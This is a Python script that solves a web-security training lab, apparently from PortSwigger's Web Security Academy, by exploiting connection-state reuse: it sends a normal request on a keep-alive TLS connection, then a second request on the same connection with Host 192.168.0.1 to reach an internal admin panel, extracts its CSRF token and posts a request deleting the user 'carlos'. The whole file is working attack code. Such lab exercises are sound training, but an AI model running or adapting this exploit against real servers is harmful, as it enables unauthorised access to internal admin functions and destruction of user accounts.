import socket
import ssl
import re
import requests
import sys


class LabSolver:
    def __init__(self, lab_url):
        self.lab_url = lab_url if lab_url.endswith('/') else lab_url + '/'
        self.session = requests.Session()

    @staticmethod
    def send_requests_on_same_connection(my_requests: list, hostname, port):
        context = ssl.create_default_context()
        cookies = {
            'session': None,
            '_lab': None
        }
        responses = {}
        with socket.create_connection((hostname, port)) as sock:
            with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                ssock.settimeout(1)
                for i, request in enumerate(my_requests):
                    if request['path']:
                        request_line = f'{request['method']} /{request['path']} HTTP/1.1\r\n'
                    else:
                        request_line = f'{request['method']} / HTTP/1.1\r\n'

                    headers = f'Host: {request['host']}\r\n'

                    if request['cookies']:
                        cookie_str = '; '.join([f'{key}={value}' for key, value in request['cookies'].items()])
                        headers += f'Cookie: {cookie_str}\r\n'

                    if cookies['session'] and not request['cookies']:
                        cookie_str = '; '.join([f'{key}={value}' for key, value in cookies.items()])
                        headers += f'Cookie: {cookie_str}\r\n'

                    body = ''
                    if request['method'] == 'POST' and request['data']:
                        body = '&'.join([f'{key}={value}' for key, value in request['data'].items()])

                        headers += f'Content-Type: application/x-www-form-urlencoded\r\n'
                        headers += f'Content-Length: {len(body)}\r\n'

                    headers += 'Connection: {}\r\n'.format(request['connection'])
                    headers += '\r\n'

                    full_request = request_line + headers + body

                    ssock.sendall(full_request.encode('utf-8'))

                    response = b''
                    while True:
                        try:
                            data = ssock.recv(4096)
                            if not data:
                                break
                            response += data
                        except socket.timeout:
                            break

                    if i == 0 and not request['cookies']:
                        cookies['session'] = re.search(br'session=(.*?);', response).group(1).decode()
                        cookies['_lab'] = re.search(br'_lab=(.*?);', response).group(1).decode()

                    status_code = response.split(b'\r\n')[0].split(b' ')[1]
                    res = response.split(b'\r\n\r\n', 1)[1]

                    responses[i] = [cookies, status_code.decode('utf-8'), res.decode('utf-8')]
                return responses

    def delete_carlos(self):
        my_requests = [
            {
                'path': '',
                'method': 'GET',
                'host': self.lab_url.replace('https://', '').rstrip('/'),
                'cookies': None,
                'connection': 'keep-alive'
            },
            {
                'path': 'admin',
                'method': 'GET',
                'host': '192.168.0.1',
                'cookies': None,
                'connection': 'close'
            },
        ]
        responses = self.send_requests_on_same_connection(my_requests, self.lab_url.replace('https://', '').rstrip('/'), 443)

        csrf = re.search(r'name="csrf" value="(.*)"', responses[1][2]).group(1)
        data = {
            'username': 'carlos',
            'csrf': csrf
        }

        my_requests = [
            {
                'path': '',
                'method': 'GET',
                'host': self.lab_url.replace('https://', '').rstrip('/'),
                'cookies': responses[1][0],
                'connection': 'keep-alive'
            },
            {
                'path': 'admin/delete',
                'method': 'POST',
                'host': '192.168.0.1',
                'cookies': responses[1][0],
                'connection': 'close',
                'data': data
            },
        ]
        self.send_requests_on_same_connection(my_requests, self.lab_url.replace('https://', '').rstrip('/'), 443)

    def check_solution(self):
        response = self.session.get(self.lab_url)
        if 'Congratulations, you solved the lab!' in response.text:
            print('You solved the lab.')
            print('Coded by Mohamed Ahmed (ma4747gh).')
            print('My GitHub account: https://github.com/ma4747gh')
            print('My LinkedIn account: https://eg.linkedin.com/in/ma4747gh')

    def solve(self):
        self.delete_carlos()
        self.check_solution()


solver = LabSolver(sys.argv[1])
solver.solve()
